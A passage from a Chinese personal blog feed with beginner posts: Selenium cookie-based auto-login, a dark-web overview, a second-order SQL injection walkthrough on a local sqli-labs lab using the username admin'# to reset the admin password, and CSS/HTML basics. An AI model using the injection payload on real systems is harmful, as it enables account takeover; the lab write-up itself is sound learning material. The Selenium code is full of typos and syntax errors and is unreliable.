        <content type="html"><![CDATA[<h1 id="前言：最近在学习python的selenium-模块，也想试着去写一些自动化操作。在过程中便遇到了，如何登录一次，第二次可以实现自动登陆的效果。"><a href="#前言：最近在学习python的selenium-模块，也想试着去写一些自动化操作。在过程中便遇到了，如何登录一次，第二次可以实现自动登陆的效果。" class="headerlink" title="#前言：最近在学习python的selenium 模块，也想试着去写一些自动化操作。在过程中便遇到了，如何登录一次，第二次可以实现自动登陆的效果。"></a>#前言：最近在学习python的selenium 模块，也想试着去写一些自动化操作。在过程中便遇到了，如何登录一次，第二次可以实现自动登陆的效果。</h1><h2 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h2><p>如果对浏览器有一些了解就知道，用户登陆某个网站之后，服务器就会把用户登陆凭证存储在本地，方便下次不用手动登陆，但这个的登陆凭证是有时效性的，每个网站都不一样 ——- 这便就是cookie </p><p>我们可以利用 selenium模块的 get_cookies() ，pickic 模块的 pickic.dump 把用户的cookie 保存下来 ， 再利用pickle.load() 把文件读取出来然后依次遍历加载到 selenium 模块的 add_cookie()  便可以实现自动登陆。</p><h2 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">get_cookies()    <span class="comment"># 获取cooike </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add_cookie(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;) <span class="comment"># 添加cookie的名字和值</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file)  <span class="comment"># 将Python数据转换并保存到pickle格式的文件内</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.load(file)   # 从pickle格式的文件中读取数据并转换为python的类型</span><br></pre></td></tr></table></figure><h2 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  <span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> pickle </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line">log_url=<span class="string">&#x27;&#x27;</span> <span class="comment">#要登录的网站</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">log</span>:             </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    self.Loginstatus=<span class="number">1</span> <span class="comment"># 创造一个类 并构造一个初始化函数 定义一个登录初始化状态为1 等于1时说明已经登陆使用cookie登陆 为0时则需要登陆</span></span><br><span class="line">    seif.driver=webdriver.Firefox() <span class="comment"># 打开浏览器 </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.loginstatus == <span class="number">0</span></span><br><span class="line">           seif.driver.get(log_url)  <span class="comment"># 登陆状态为0 需要登陆</span></span><br><span class="line">        <span class="keyword">elif</span> self.loginstatus == <span class="number">1</span></span><br><span class="line">             <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;cookie.pkl&#x27;</span>):  <span class="comment"># 判段没有 cookie.plk 就调通 set_cookie函数,反之调用get_cookie</span></span><br><span class="line">                 set_cookie()</span><br><span class="line">             <span class="keyword">else</span>:</span><br><span class="line">                 get_cookie()  </span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line">    <span class="keyword">def</span>  <span class="title function_">set_cookie</span>(<span class="params">self</span>):       <span class="comment"># 这时判断文件中没有cookies.plk 文件便跳到登陆</span></span><br><span class="line">         seif.dirver.get(log_url)  <span class="comment">#登陆</span></span><br><span class="line">         pickle.dump(seif.dirver.get_cookies(),<span class="built_in">open</span>(<span class="string">&#x27;cookies.plk&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="comment">#使用get_cookies()获取cookie 再用 pickle.dum保存为一个plk文件</span></span><br><span class="line">         </span><br><span class="line">                     </span><br><span class="line">   <span class="keyword">def</span>  <span class="title function_">get_cookie</span>(<span class="params">self</span>):</span><br><span class="line">        seif.dirers.get(loh_url)</span><br><span class="line">                cookie =   pickle.load(<span class="built_in">open</span>(<span class="string">&#x27;cookies.plk&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)) <span class="comment">#使用pickle读取cookies.pkl 文件 并赋值给cookie</span></span><br><span class="line">        <span class="keyword">for</span> cookies <span class="keyword">in</span> cookie               <span class="comment"># 循环遍历cookie 并放入 cookies中</span></span><br><span class="line">            cookie_tie=&#123;</span><br><span class="line">                     <span class="string">&quot;name&quot;</span>: <span class="string">&quot;cookies.get(&#x27;name&#x27;)&quot;</span>,         <span class="comment"># 因为cookie 有很多条数据每条数据样所对应的name 和 value 值                                                                                                               不一样                                                                            所以用get获取值。循环加入进去 实际上用不到                                                                                                    所有cookie数据  </span></span><br><span class="line">                      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;cookies.get(&#x27;value&#x27;)    </span></span><br><span class="line"><span class="string">            &#125;                            </span></span><br><span class="line"><span class="string">         self.driver.add_cookie(cookie_tie)     # 最后载入进去</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                     </span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">  if __main__ == &#x27;__name__&#x27;  #相当于c语言中的main 函数</span></span><br><span class="line"><span class="string">       con=log() # 实例化这个类</span></span><br><span class="line"><span class="string">       con.login() # 调用登陆函数</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        </span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈暗网</title>
      <link href="/2023/06/08/%E6%B5%85%E8%B0%88%E6%9A%97%E7%BD%91/"/>
      <url>/2023/06/08/%E6%B5%85%E8%B0%88%E6%9A%97%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈一下被营销号口中认为非常神秘的暗网。"><a href="#浅谈一下被营销号口中认为非常神秘的暗网。" class="headerlink" title="#浅谈一下被营销号口中认为非常神秘的暗网。"></a>#浅谈一下被营销号口中认为非常神秘的暗网。</h1><p>我们先看一下维基百科对暗网的解释:</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">黑暗网站（英语：Dark web）多简称为暗网，是存在于黑暗网络、覆盖网络上的万维网内容，只能用特殊软件、特殊授权、或对电脑做特殊设置才能访问</span><br><span class="line">暗网是由深网的一小部分所构成的。而深网的网络不能够被正常网络搜索引擎（如谷歌、雅虎等）索引，有时“深网”这一术语经常被错误地用于指代暗网</span><br><span class="line">构成暗网的隐藏服务网络包括F2F的小型点对点网络以及由公共组织和个人运营的大型流行网络，如Tor、自由网、I2P和Riffle。暗网用户基于常规网络未加密的性质将其称为明网。Tor暗网可以称为洋葱区域（onionland），其使用网络顶级域后缀.onion和洋葱路由的流量匿名化技术。</span><br><span class="line">黑暗网络还被用于非法活动，如非法交易、非法论坛以及恋童癖者和恐怖分子的介质交流。与此同时，传统网站为Tor浏览器提供了访问方式，以便与用户创建联系。</span><br></pre></td></tr></table></figure><p>在看一下百度的解释:</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">我们日常使用的搜索引擎所无法寻找到的，仅能在电脑上进行一系列特殊的操作设置或在特殊软件的辅助之下又或对本机的特殊授权之后方能进入访问的一种网络——即称之为“暗网”。“暗网”之中的数据统统是以常规手段去检索难度极大的“隐身”的方式进行传输交流，服务器地址亦是如此。此外，极高的私密性是其中用户联系彼此的一大特点，对进行拦截的手段和网络技术的要求极高，并且破译拦截后的信息也是一大难题。暗网是深网的一个分支，目前可以通过“洋葱网络”或者“I2P网络”进行。统计数据表明，我们平时所能见的表层网络的域名数量仅仅占据暗网的1/400到1/500。 </span><br><span class="line">暗网因其与生俱来的隐匿特性，现在被不法分子广泛运用于网络犯罪。从个人行为的网络黑客窃密、数字货币交易、私售非法禁售物品到国家意志的间谍行动，都依托暗网的隐匿服务，因此暗网的存在对防范新型网络、经济、危害国家安全等犯罪行为提出了严峻挑战，特别是公安、国安部门在查处犯罪时追踪溯源方面提出了巨大的挑战。暗网因其巨大的危害特性也被列为新型网络威胁之一。 </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="个人对暗网的看法"><a href="#个人对暗网的看法" class="headerlink" title="个人对暗网的看法"></a>个人对暗网的看法</h2><p>其实进去暗网并不需要太难的技术 只需要一个软件和提供的网桥就可以进去，至于儿童色情,血腥视频，毒品枪械交易确实存在。但暗网中的大多数网站都是诈骗网站。十个暗网网站九个诈骗。如下图.</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202306081806323.png"></p><p>如果你对暗网感兴趣过，肯定听说过“红房子”—一个杀人直播，以及所谓的雇佣杀手。有报道称暗网存在众筹暗杀雇佣杀手、暗杀市集及暗杀服务。然而，这些业务被认为是诈骗。丝绸之路的创始人罗斯·乌布利希（Ross Ulbricht）因他的违法网站遭国土安全调查部门（HSI）逮捕，据称他雇用一名杀手杀死了六个人，但这些指控后来被撤销。</p><p>有一个都市传说称人们可以在暗网上找到谋杀直播。“红屋子”（Red Room）这个词根据日本动画和同名的都市传说创造而来。然而，证据表明所有相关的报告都只是恶作剧。现在比较热门的中文交易网站是所谓的长安不夜城。因本人也没有在上面购买过任何的东西，无法确认交易的真实性。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202306081826515.png"></p><p>下面这张是枪支贩卖网站，我觉得真实性没必要去深究。</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202306081831180.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对普通人没什么卵用，对需要的人还要小心诈骗网站。最后网络不是法外之地。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入--二次注入</title>
      <link href="/2023/04/15/sql%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/04/15/sql%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言-学习了一下sql注入中的二次注入-特写下这篇文章记录一下。"><a href="#前言-学习了一下sql注入中的二次注入-特写下这篇文章记录一下。" class="headerlink" title="#前言: 学习了一下sql注入中的二次注入,特写下这篇文章记录一下。"></a>#前言: 学习了一下sql注入中的二次注入,特写下这篇文章记录一下。</h1><p>靶场: <a href="http://127.0.0.1/sqli-labs-master/Less-24/new_user.php">http://127.0.0.1/sqli-labs-master/Less-24/new_user.php</a></p><p>注入原理：1.先构造恶意语句(转义字符)，2.存入数据库中(让网站认为数据是合法的)。3.再次取出，执行恶意语句。</p><h2 id="访问靶场"><a href="#访问靶场" class="headerlink" title="访问靶场"></a>访问靶场</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">通过下面的图可以看出是个用户登录框。为了满足上面注入的原理，我们可以创建带有恶意语句的用户名存入数据库中。</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202304151542452.png"></p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">进入数据库中查看用户名，是否插入进去。 如图所示已经在里面了。</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202304151553639.png"></p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">登录进去之后是一个重置密码的页面，更具上图我们可以看到有个admin用户名。</span><br><span class="line">之前创建的用户名admin&#x27;# 更改我们的用户名，admin 也会发生改变。</span><br><span class="line">这个可以去php 代码里看。可以看到 admin 的密码变成1111了。</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202304151603358.png"></p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">打开 对应的php 文件. 下面是密码更新语句.</span><br><span class="line">如果我们把 &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; </span><br><span class="line">改为:&quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;  </span><br><span class="line">可以发现admin&#x27; 和前面闭合起来成一个语句。 # 注释掉后面的语句了.</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web前端--css</title>
      <link href="/2023/01/26/web%E5%89%8D%E7%AB%AF-css/"/>
      <url>/2023/01/26/web%E5%89%8D%E7%AB%AF-css/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>html 相当于网页的骨架，为了让网页看起来更好看就需要用到css。</p><h2 id="css选择器"><a href="#css选择器" class="headerlink" title="css选择器"></a>css选择器</h2><h3 id="标签选择器："><a href="#标签选择器：" class="headerlink" title="标签选择器："></a>标签选择器：</h3><p>使用style 标签子标签 里面使用对应的标签，使用的范围可以是整个块元素</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;wallhaven-5g7ew7.jpg&quot;</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">h1</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: azure;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">text-align</span>: left;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">            我的博客</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>                 </span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>丑奴儿·书博山道中壁<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">b</span>&gt;</span> 【宋】 辛弃疾<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;gushi&quot;</span>&gt;</span> 少年不识愁滋味，爱上层楼。爱上层楼，为赋新词强说愁。<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;rate&quot;</span>&gt;</span> 而今识尽愁滋味，欲说还休。欲说还休，却道天凉好个秋。<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果如图：</strong></p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301261721835.jpg" style="zoom:50%;" /><h3 id="id选择器："><a href="#id选择器：" class="headerlink" title="id选择器："></a>id选择器：</h3><p>可以使用在单个标签和标签选择器比较他的范围更细。<code>在对应的标签里添加id属性 再在style标签中 写上 #(id的值)</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;wallhaven-5g7ew7.jpg&quot;</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">h1</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: azure;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">text-align</span>: left;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-id">#gushi</span> &#123;</span></span><br><span class="line"><span class="language-css">     <span class="attribute">background-color</span>: cornflowerblue;</span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">&#125; </span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">            我的博客</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>                 </span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>丑奴儿·书博山道中壁<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">b</span>&gt;</span> 【宋】 辛弃疾<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;gushi&quot;</span>&gt;</span> 少年不识愁滋味，爱上层楼。爱上层楼，为赋新词强说愁。<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">i</span>&gt;</span> 而今识尽愁滋味，欲说还休。欲说还休，却道天凉好个秋。<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果如图:</strong></p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202301261729520.jpg" style="zoom:50%;" /><h3 id="类别选择器"><a href="#类别选择器" class="headerlink" title="类别选择器:"></a>类别选择器:</h3><p>类别选择器在标签定义一个class属性和对应的值，可以定义多个属性。<code>需要加上**.**</code>。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;wallhaven-5g7ew7.jpg&quot;</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.rate</span> &#123;</span></span><br><span class="line"><span class="language-css">                 <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">            我的博客</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>                 </span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>丑奴儿·书博山道中壁<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">b</span>&gt;</span> 【宋】 辛弃疾<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span> &gt;</span> 少年不识愁滋味，爱上层楼。爱上层楼，为赋新词强说愁。<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;rate&quot;</span>&gt;</span> 而今识尽愁滋味，欲说还休。欲说还休，却道天凉好个秋。<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web前端--html</title>
      <link href="/2023/01/13/web%E5%89%8D%E7%AB%AF-html/"/>
      <url>/2023/01/13/web%E5%89%8D%E7%AB%AF-html/</url>
      
        <content type="html"><![CDATA[<h1 id="今天学习了web前端html-特写下此篇学习记录"><a href="#今天学习了web前端html-特写下此篇学习记录" class="headerlink" title="今天学习了web前端html,特写下此篇学习记录"></a>今天学习了web前端html,特写下此篇学习记录</h1><h2 id="1-关于编译器的推荐。"><a href="#1-关于编译器的推荐。" class="headerlink" title="1.关于编译器的推荐。"></a>1.关于编译器的推荐。</h2><p>用记事本也可以编写网页，但面对庞大复杂的工作量的情况下使用记事本显然不可能。我使用的软件是 <a href="https://www.dcloud.io/hbuilderx.html">hbuilde</a> ，也可以使用vscode那种。</p><h2 id="2-html的基本框架"><a href="#2-html的基本框架" class="headerlink" title="2.html的基本框架"></a>2.html的基本框架</h2><p>无论是多么复杂的html代码.基本框架都是不变的。万变不离其宗</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>html也叫做超文本标记语言自然离不开标签，浏览器通过识别标签来渲染网页。可以把上代码看成一个身体，<strong>html</strong>里面的内容看成一个整体。<strong>head</strong>是头部，<strong>body</strong>是身体也是主要的内容。 然而<strong>head</strong>里面还包裹了一个<strong>title</strong>他们两个关系就像父子一样。<strong>head</strong>就是父级，被包裹的<strong>title</strong>就是子级。和<strong>head</strong>并列的<strong>body</strong>就像兄弟之间的关系。<u>如果你用的我推荐的hbuilde，创建文件时会自动生成以上代码</u></p><h2 id="标签的介绍"><a href="#标签的介绍" class="headerlink" title="标签的介绍"></a>标签的介绍</h2><h3 id="基本标签："><a href="#基本标签：" class="headerlink" title="基本标签："></a>基本标签：</h3><table><thead><tr><th>标签</th><th align="center">作用</th><th>可添加属性</th></tr></thead><tbody><tr><td>&lt;br</td><td align="center">换行</td><td></td></tr><tr><td>&lt;p</td><td align="center">段落</td><td>&lt;align&#x3D;”center” “right” “left”   分别为居中，靠右，靠左   <u>在html5中已经不使用这种方法改为css实现</u></td></tr><tr><td>&lt;i</td><td align="center">倾斜</td><td></td></tr><tr><td>&lt;u</td><td align="center">下划线</td><td></td></tr><tr><td>&lt;b</td><td align="center">字体加粗</td><td></td></tr><tr><td>&lt;img</td><td align="center">插入图片</td><td>src&#x3D;”.&#x2F;xxx&#x2F;.jpg”   title&#x3D;”xxx”  alt&#x3D;”xxx”   width&#x3D;”xx”  align&#x3D;” “<strong>解释：</strong>src可以插入<sup>1</sup>相对路径和<sup>2</sup>绝对路径；title当你鼠标停悬在图片上显示的文字 。 alt 当图片加载不出来显示的文字; width(height):设置图片固定的尺寸</td></tr><tr><td>&lt;link</td><td align="center">当前文档引用外部资源</td><td>href&#x3D;”urll或者相对路径”                rel&#x3D;”  value “  rel 属性用于指定当前文档与被链接文档的关系 详细的可以查询资料</td></tr><tr><td>&lt;hr</td><td align="center">一条横线</td><td></td></tr></tbody></table><p>如果想添加网站的图标可以这样:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>我的第一个html页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;favicon.ico&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span 